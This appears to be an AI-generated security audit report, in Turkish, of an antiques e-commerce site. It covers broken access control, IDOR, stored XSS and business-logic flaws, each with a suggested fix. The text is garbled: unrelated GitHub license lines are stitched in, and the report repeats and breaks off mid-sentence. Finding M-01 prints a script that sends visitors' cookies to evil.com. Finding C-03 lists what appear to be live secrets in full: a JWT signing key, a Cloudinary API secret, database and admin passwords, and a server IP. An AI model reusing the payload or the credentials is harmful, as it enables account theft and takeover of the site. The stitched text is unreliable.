### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key:
```


## License: unknown
https://github.com/Aviortheking/games/blob/392a5f75cb70d467a0e001317f6ed236c48123bc/dzeio.next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: Apache-2.0
https://github.com/bettercollected/bettercollected/blob/488dc508c1e666fc17a9d35acf67feea15e8fb0b/webapp/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
